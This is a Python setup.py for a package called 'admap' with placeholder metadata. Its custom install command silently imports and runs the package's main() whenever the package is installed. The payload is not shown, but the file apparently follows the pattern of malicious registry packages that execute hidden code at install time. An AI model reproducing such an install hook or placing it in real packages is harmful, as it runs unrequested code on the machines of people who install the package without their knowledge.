from setuptools import setup, find_packages
from setuptools.command.install import install


class CrazyInstallStrat(install):
    def run(self):
        from admap import main
        main()
        install.run(self)

setup(
    name="admap",
    version="2.0.0",
    author="x",
    author_email="watchandthink@outlook.com",
    description="x",
    long_description_content_type="text/markdown",
    long_description="xxx",
    cmdclass={
        'install': CrazyInstallStrat,
    },
    install_requires=['requests'],
    setup_requires=['setuptools']
)
